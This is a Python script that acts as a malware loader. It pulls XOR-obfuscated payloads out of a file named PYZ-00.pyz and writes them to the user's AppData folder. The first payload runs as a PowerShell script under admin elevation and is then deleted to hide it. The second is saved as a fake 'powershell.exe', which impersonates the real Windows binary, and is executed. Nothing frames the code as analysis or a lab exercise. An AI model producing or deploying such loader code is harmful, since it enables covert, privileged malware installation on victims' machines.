import time
import subprocess, sys
import os

filename = "PYZ-00.pyz"
roaming = os.getenv('APPDATA')

with open(filename, 'rb') as file_a:

    a_content = file_a.read()

    # for activate.ps1
    start_pos = 0
    start_pos = a_content.find(b'\n--- XOR result starts here ---\n', start_pos)

    if start_pos == -1:
        exit()

    end_pos = a_content.find(b'\n--- XOR result ends here ---\n', start_pos)
    xor_result = a_content[start_pos+len(b'\n--- XOR result starts here ---\n'):end_pos]
    xor_result = bytes([b ^ 0x62 for b in xor_result])

    with open(f"{roaming}/activate.ps1", 'wb') as file_b:
        file_b.write(xor_result)

    time.sleep(0.1)
    p = subprocess.Popen(
        [
            "powershell.exe", 
            "-noprofile", "-c",
            r"""
            Start-Process -Verb RunAs -Wait powershell.exe -Args "
            -noprofile -c Set-Location \`"$PWD\`"; & '$env:APPDATA\activate.ps1'
            "
            """
        ],
        stdout = sys.stdout
    )
    p.communicate()
    os.remove(f"{roaming}/activate.ps1")
    # subprocess.run(f"{roaming}/activate.ps1", shell=True)

    # for update.exe
    start_pos += 1
    start_pos = a_content.find(b'\n--- XOR result starts here ---\n', start_pos)

    if start_pos == -1:
        exit()

    end_pos = a_content.find(b'\n--- XOR result ends here ---\n', start_pos)
    xor_result = a_content[start_pos+len(b'\n--- XOR result starts here ---\n'):end_pos]
    xor_result = bytes([b ^ 0x62 for b in xor_result])

    with open(f"{roaming}/powershell.exe", 'wb') as file_b:
        file_b.write(xor_result)

    time.sleep(0.1)
    subprocess.run(f"{roaming}/powershell.exe", shell=True)